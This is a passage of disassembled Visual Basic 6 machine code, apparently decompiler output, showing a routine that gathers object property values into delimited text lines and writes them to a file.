008D08E1: call 00410A18h ; &
008D08E6: mov edx, eax
008D08E8: lea ecx, var_78
008D08EB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D08F0: push eax
008D08F1: push 00445568h
008D08F6: call 00410A18h ; &
008D08FB: mov edx, eax
008D08FD: lea ecx, var_7C
008D0900: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0905: push eax
008D0906: push 00000010h
008D0908: pop eax
008D0909: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D090E: lea esi, var_00000294
008D0914: mov edi, esp
008D0916: movsd 
008D0917: movsd 
008D0918: movsd 
008D0919: movsd 
008D091A: push 00000001h
008D091C: push 00000010h
008D091E: push 00440E58h
008D0923: push 00000010h
008D0925: pop eax
008D0926: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D092B: lea esi, var_00000284
008D0931: mov edi, esp
008D0933: movsd 
008D0934: movsd 
008D0935: movsd 
008D0936: movsd 
008D0937: push 00000001h
008D0939: push 00000000h
008D093B: push 00440E48h
008D0940: push 00000000h
008D0942: push 00000018h
008D0944: mov eax, [ebp+08h]
008D0947: mov eax, [eax]
008D0949: push [ebp+08h]
008D094C: call [eax+00000314h]
008D0952: push eax
008D0953: lea eax, var_000000C4
008D0959: push eax
008D095A: call 00410A84h ; Set (object)
008D095F: push eax
008D0960: lea eax, var_00000184
008D0966: push eax
008D0967: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D096C: add esp, 00000010h
008D096F: push eax
008D0970: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D0975: push eax
008D0976: lea eax, var_000000C8
008D097C: push eax
008D097D: call 00410A84h ; Set (object)
008D0982: push eax
008D0983: lea eax, var_00000194
008D0989: push eax
008D098A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D098F: add esp, 00000020h
008D0992: push eax
008D0993: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D0998: push eax
008D0999: lea eax, var_000000CC
008D099F: push eax
008D09A0: call 00410A84h ; Set (object)
008D09A5: push eax
008D09A6: lea eax, var_000001A4
008D09AC: push eax
008D09AD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D09B2: add esp, 00000020h
008D09B5: push eax
008D09B6: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D09BB: mov edx, eax
008D09BD: lea ecx, var_80
008D09C0: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D09C5: push eax
008D09C6: call 00410A18h ; &
008D09CB: mov edx, eax
008D09CD: lea ecx, var_00000084
008D09D3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D09D8: push eax
008D09D9: push 00445568h
008D09DE: call 00410A18h ; &
008D09E3: mov edx, eax
008D09E5: lea ecx, var_00000088
008D09EB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D09F0: push eax
008D09F1: push 00000010h
008D09F3: pop eax
008D09F4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D09F9: lea esi, var_000002C4
008D09FF: mov edi, esp
008D0A01: movsd 
008D0A02: movsd 
008D0A03: movsd 
008D0A04: movsd 
008D0A05: push 00000001h
008D0A07: push 00000010h
008D0A09: push 00440E58h
008D0A0E: push 00000010h
008D0A10: pop eax
008D0A11: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D0A16: lea esi, var_000002B4
008D0A1C: mov edi, esp
008D0A1E: movsd 
008D0A1F: movsd 
008D0A20: movsd 
008D0A21: movsd 
008D0A22: push 00000001h
008D0A24: push 00000000h
008D0A26: push 00440E48h
008D0A2B: push 00000000h
008D0A2D: push 00000018h
008D0A2F: mov eax, [ebp+08h]
008D0A32: mov eax, [eax]
008D0A34: push [ebp+08h]
008D0A37: call [eax+00000314h]
008D0A3D: push eax
008D0A3E: lea eax, var_000000D0
008D0A44: push eax
008D0A45: call 00410A84h ; Set (object)
008D0A4A: push eax
008D0A4B: lea eax, var_000001B4
008D0A51: push eax
008D0A52: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D0A57: add esp, 00000010h
008D0A5A: push eax
008D0A5B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D0A60: push eax
008D0A61: lea eax, var_000000D4
008D0A67: push eax
008D0A68: call 00410A84h ; Set (object)
008D0A6D: push eax
008D0A6E: lea eax, var_000001C4
008D0A74: push eax
008D0A75: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D0A7A: add esp, 00000020h
008D0A7D: push eax
008D0A7E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D0A83: push eax
008D0A84: lea eax, var_000000D8
008D0A8A: push eax
008D0A8B: call 00410A84h ; Set (object)
008D0A90: push eax
008D0A91: lea eax, var_000001D4
008D0A97: push eax
008D0A98: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D0A9D: add esp, 00000020h
008D0AA0: push eax
008D0AA1: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D0AA6: mov edx, eax
008D0AA8: lea ecx, var_0000008C
008D0AAE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0AB3: push eax
008D0AB4: call 00410A18h ; &
008D0AB9: mov edx, eax
008D0ABB: lea ecx, var_00000090
008D0AC1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0AC6: push eax
008D0AC7: push 00445568h
008D0ACC: call 00410A18h ; &
008D0AD1: mov edx, eax
008D0AD3: lea ecx, var_00000094
008D0AD9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0ADE: push eax
008D0ADF: push 00000010h
008D0AE1: pop eax
008D0AE2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D0AE7: lea esi, var_000002F4
008D0AED: mov edi, esp
008D0AEF: movsd 
008D0AF0: movsd 
008D0AF1: movsd 
008D0AF2: movsd 
008D0AF3: push 00000001h
008D0AF5: push 00000010h
008D0AF7: push 00440E58h
008D0AFC: push 00000010h
008D0AFE: pop eax
008D0AFF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D0B04: lea esi, var_000002E4
008D0B0A: mov edi, esp
008D0B0C: movsd 
008D0B0D: movsd 
008D0B0E: movsd 
008D0B0F: movsd 
008D0B10: push 00000001h
008D0B12: push 00000000h
008D0B14: push 00440E48h
008D0B19: push 00000000h
008D0B1B: push 00000018h
008D0B1D: mov eax, [ebp+08h]
008D0B20: mov eax, [eax]
008D0B22: push [ebp+08h]
008D0B25: call [eax+00000314h]
008D0B2B: push eax
008D0B2C: lea eax, var_000000DC
008D0B32: push eax
008D0B33: call 00410A84h ; Set (object)
008D0B38: push eax
008D0B39: lea eax, var_000001E4
008D0B3F: push eax
008D0B40: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D0B45: add esp, 00000010h
008D0B48: push eax
008D0B49: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D0B4E: push eax
008D0B4F: lea eax, var_000000E0
008D0B55: push eax
008D0B56: call 00410A84h ; Set (object)
008D0B5B: push eax
008D0B5C: lea eax, var_000001F4
008D0B62: push eax
008D0B63: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D0B68: add esp, 00000020h
008D0B6B: push eax
008D0B6C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D0B71: push eax
008D0B72: lea eax, var_000000E4
008D0B78: push eax
008D0B79: call 00410A84h ; Set (object)
008D0B7E: push eax
008D0B7F: lea eax, var_00000204
008D0B85: push eax
008D0B86: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D0B8B: add esp, 00000020h
008D0B8E: push eax
008D0B8F: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D0B94: mov edx, eax
008D0B96: lea ecx, var_00000098
008D0B9C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0BA1: push eax
008D0BA2: call 00410A18h ; &
008D0BA7: mov edx, eax
008D0BA9: lea ecx, var_0000009C
008D0BAF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0BB4: push eax
008D0BB5: push 00441264h ; vbCrLf
008D0BBA: call 00410A18h ; &
008D0BBF: mov edx, eax
008D0BC1: lea ecx, var_44
008D0BC4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0BC9: lea eax, var_0000009C
008D0BCF: push eax
008D0BD0: lea eax, var_00000098
008D0BD6: push eax
008D0BD7: lea eax, var_00000094
008D0BDD: push eax
008D0BDE: lea eax, var_00000090
008D0BE4: push eax
008D0BE5: lea eax, var_0000008C
008D0BEB: push eax
008D0BEC: lea eax, var_00000088
008D0BF2: push eax
008D0BF3: lea eax, var_00000084
008D0BF9: push eax
008D0BFA: lea eax, var_80
008D0BFD: push eax
008D0BFE: lea eax, var_7C
008D0C01: push eax
008D0C02: lea eax, var_78
008D0C05: push eax
008D0C06: lea eax, var_74
008D0C09: push eax
008D0C0A: lea eax, var_70
008D0C0D: push eax
008D0C0E: lea eax, var_6C
008D0C11: push eax
008D0C12: lea eax, var_68
008D0C15: push eax
008D0C16: lea eax, var_64
008D0C19: push eax
008D0C1A: lea eax, var_60
008D0C1D: push eax
008D0C1E: lea eax, var_5C
008D0C21: push eax
008D0C22: push 00000011h
008D0C24: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D0C29: add esp, 00000048h
008D0C2C: lea eax, var_000000E4
008D0C32: push eax
008D0C33: lea eax, var_000000E0
008D0C39: push eax
008D0C3A: lea eax, var_000000DC
008D0C40: push eax
008D0C41: lea eax, var_000000D8
008D0C47: push eax
008D0C48: lea eax, var_000000D4
008D0C4E: push eax
008D0C4F: lea eax, var_000000D0
008D0C55: push eax
008D0C56: lea eax, var_000000CC
008D0C5C: push eax
008D0C5D: lea eax, var_000000C8
008D0C63: push eax
008D0C64: lea eax, var_000000C4
008D0C6A: push eax
008D0C6B: lea eax, var_000000C0
008D0C71: push eax
008D0C72: lea eax, var_000000BC
008D0C78: push eax
008D0C79: lea eax, var_000000B8
008D0C7F: push eax
008D0C80: lea eax, var_000000B4
008D0C86: push eax
008D0C87: lea eax, var_000000B0
008D0C8D: push eax
008D0C8E: lea eax, var_000000AC
008D0C94: push eax
008D0C95: lea eax, var_000000A8
008D0C9B: push eax
008D0C9C: lea eax, var_000000A4
008D0CA2: push eax
008D0CA3: lea eax, var_000000A0
008D0CA9: push eax
008D0CAA: push 00000012h
008D0CAC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D0CB1: add esp, 0000004Ch
008D0CB4: lea eax, var_00000204
008D0CBA: push eax
008D0CBB: lea eax, var_000001F4
008D0CC1: push eax
008D0CC2: lea eax, var_000001E4
008D0CC8: push eax
008D0CC9: lea eax, var_000001D4
008D0CCF: push eax
008D0CD0: lea eax, var_000001C4
008D0CD6: push eax
008D0CD7: lea eax, var_000001B4
008D0CDD: push eax
008D0CDE: lea eax, var_000001A4
008D0CE4: push eax
008D0CE5: lea eax, var_00000194
008D0CEB: push eax
008D0CEC: lea eax, var_00000184
008D0CF2: push eax
008D0CF3: lea eax, var_00000174
008D0CF9: push eax
008D0CFA: lea eax, var_00000164
008D0D00: push eax
008D0D01: lea eax, var_00000154
008D0D07: push eax
008D0D08: lea eax, var_00000144
008D0D0E: push eax
008D0D0F: lea eax, var_00000134
008D0D15: push eax
008D0D16: lea eax, var_00000124
008D0D1C: push eax
008D0D1D: lea eax, var_00000114
008D0D23: push eax
008D0D24: lea eax, var_00000104
008D0D2A: push eax
008D0D2B: lea eax, var_000000F4
008D0D31: push eax
008D0D32: push 00000012h
008D0D34: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D0D39: add esp, 0000004Ch
008D0D3C: mov var_04, 00000011h
008D0D43: lea eax, var_00000354
008D0D49: push eax
008D0D4A: lea eax, var_00000344
008D0D50: push eax
008D0D51: lea eax, var_30
008D0D54: push eax
008D0D55: call 00410A36h ; Next
008D0D5A: mov var_00000374, eax
008D0D60: cmp var_00000374, 00000000h
008D0D67: jnz 008D058Bh
008D0D6D: mov var_04, 00000012h
008D0D74: mov var_000000EC, 80020004h
008D0D7E: mov var_000000F4, 0000000Ah
008D0D88: lea eax, var_000000F4
008D0D8E: push eax
008D0D8F: call 004108C2h ; FreeFile
008D0D94: mov var_0000021C, ax
008D0D9B: mov var_00000224, 00000002h
008D0DA5: lea edx, var_00000224
008D0DAB: lea ecx, var_40
008D0DAE: call 00410922h ; msvbvm60.dll.__vbaVarMove
008D0DB3: lea ecx, var_000000F4
008D0DB9: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D0DBE: mov var_04, 00000013h
008D0DC5: lea eax, var_58
008D0DC8: push eax
008D0DC9: call 00410862h ; msvbvm60.dll.__vbaStrVarCopy
008D0DCE: mov edx, eax
008D0DD0: lea ecx, var_5C
008D0DD3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D0DD8: push eax
008D0DD9: lea eax, var_40
008D0DDC: push eax
008D0DDD: call 004109D0h ; msvbvm60.dll.__vbaI2Var
008D0DE2: push eax
008D0DE3: push FFFFFFFFh
008D0DE5: push 00000220h
008D0DEA: call 004108B6h ; Open #
008D0DEF: lea ecx, var_5C
008D0DF2: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008D0DF7: mov var_04, 00000014h
008D0DFE: lea eax, var_40
008D0E01: push eax
008D0E02: call 004109D0h ; msvbvm60.dll.__vbaI2Var
008D0E07: push eax
008D0E08: lea eax, var_44
008D0E0B: push eax
008D0E0C: push 00000000h
008D0E0E: call 0041089Eh ; Put #
008D0E13: mov var_04, 00000015h
008D0E1A: lea eax, var_40
008D0E1D: push eax
008D0E1E: call 004109D0h ; msvbvm60.dll.__vbaI2Var
008D0E23: push eax
008D0E24: call 00410898h ; Close #arg_1
008D0E29: jmp 8D0DA9h
008D0E2B: mov var_04, 00000018h
008D0E32: push 00000000h
008D0E34: push 00000003h
008D0E36: push 00440E48h
008D0E3B: push 00000000h
008D0E3D: push 00000018h
008D0E3F: mov eax, [ebp+08h]
008D0E42: mov eax, [eax]
008D0E44: push [ebp+08h]
008D0E47: call [eax+00000314h]
008D0E4D: push eax
008D0E4E: lea eax, var_000000A0
008D0E54: push eax
008D0E55: call 00410A84h ; Set (object)
008D0E5A: push eax
008D0E5B: lea eax, var_000000F4
008D0E61: push eax
008D0E62: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D0E67: add esp, 00000010h
008D0E6A: push eax
008D0E6B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D0E70: push eax
008D0E71: lea eax, var_000000A4
008D0E77: push eax
008D0E78: call 00410A84h ; Set (object)
008D0E7D: push eax
008D0E7E: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008D0E83: add esp, 0000000Ch
008D0E86: lea eax, var_000000A4
008D0E8C: push eax
008D0E8D: lea eax, var_000000A0
008D0E93: push eax
008D0E94: push 00000002h
008D0E96: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D0E9B: add esp, 0000000Ch
008D0E9E: lea ecx, var_000000F4
008D0EA4: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D0EA9: mov var_10, 00000000h
008D0EB0: push 008D1075h
008D0EB5: jmp 008D102Eh
008D0EBA: lea eax, var_0000009C
008D0EC0: push eax
008D0EC1: lea eax, var_00000098
008D0EC7: push eax
008D0EC8: lea eax, var_00000094
008D0ECE: push eax
008D0ECF: lea eax, var_00000090
008D0ED5: push eax
008D0ED6: lea eax, var_0000008C
008D0EDC: push eax
008D0EDD: lea eax, var_00000088
008D0EE3: push eax
008D0EE4: lea eax, var_00000084
008D0EEA: push eax
008D0EEB: lea eax, var_80
008D0EEE: push eax
008D0EEF: lea eax, var_7C
008D0EF2: push eax
008D0EF3: lea eax, var_78
008D0EF6: push eax
008D0EF7: lea eax, var_74
008D0EFA: push eax
008D0EFB: lea eax, var_70
008D0EFE: push eax
008D0EFF: lea eax, var_6C
008D0F02: push eax
008D0F03: lea eax, var_68
008D0F06: push eax
008D0F07: lea eax, var_64
008D0F0A: push eax
008D0F0B: lea eax, var_60
008D0F0E: push eax
008D0F0F: lea eax, var_5C
008D0F12: push eax
008D0F13: push 00000011h
008D0F15: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D0F1A: add esp, 00000048h
008D0F1D: lea eax, var_000000E4
008D0F23: push eax
008D0F24: lea eax, var_000000E0
008D0F2A: push eax
008D0F2B: lea eax, var_000000DC
008D0F31: push eax
008D0F32: lea eax, var_000000D8
008D0F38: push eax
008D0F39: lea eax, var_000000D4
008D0F3F: push eax
008D0F40: lea eax, var_000000D0
008D0F46: push eax
008D0F47: lea eax, var_000000CC
008D0F4D: push eax
008D0F4E: lea eax, var_000000C8
008D0F54: push eax
008D0F55: lea eax, var_000000C4
008D0F5B: push eax
008D0F5C: lea eax, var_000000C0
008D0F62: push eax
008D0F63: lea eax, var_000000BC
008D0F69: push eax
008D0F6A: lea eax, var_000000B8
008D0F70: push eax
008D0F71: lea eax, var_000000B4
008D0F77: push eax
008D0F78: lea eax, var_000000B0
008D0F7E: push eax
008D0F7F: lea eax, var_000000AC
008D0F85: push eax
008D0F86: lea eax, var_000000A8
008D0F8C: push eax
008D0F8D: lea eax, var_000000A4
008D0F93: push eax
008D0F94: lea eax, var_000000A0
008D0F9A: push eax
008D0F9B: push 00000012h
008D0F9D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D0FA2: add esp, 0000004Ch
008D0FA5: lea eax, var_00000204
008D0FAB: push eax
008D0FAC: lea eax, var_000001F4
008D0FB2: push eax
008D0FB3: lea eax, var_000001E4
008D0FB9: push eax
008D0FBA: lea eax, var_000001D4
008D0FC0: push eax
008D0FC1: lea eax, var_000001C4
008D0FC7: push eax
008D0FC8: lea eax, var_000001B4
008D0FCE: push eax
008D0FCF: lea eax, var_000001A4
008D0FD5: push eax
008D0FD6: lea eax, var_00000194
008D0FDC: push eax
008D0FDD: lea eax, var_00000184
008D0FE3: push eax
008D0FE4: lea eax, var_00000174
008D0FEA: push eax
008D0FEB: lea eax, var_00000164
008D0FF1: push eax
008D0FF2: lea eax, var_00000154
008D0FF8: push eax
008D0FF9: lea eax, var_00000144
008D0FFF: push eax
008D1000: lea eax, var_00000134
008D1006: push eax
008D1007: lea eax, var_00000124
008D100D: push eax
008D100E: lea eax, var_00000114
008D1014: push eax
008D1015: lea eax, var_00000104
008D101B: push eax
008D101C: lea eax, var_000000F4
008D1022: push eax
008D1023: push 00000012h
008D1025: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D102A: add esp, 0000004Ch
008D102D: ret 
End Sub

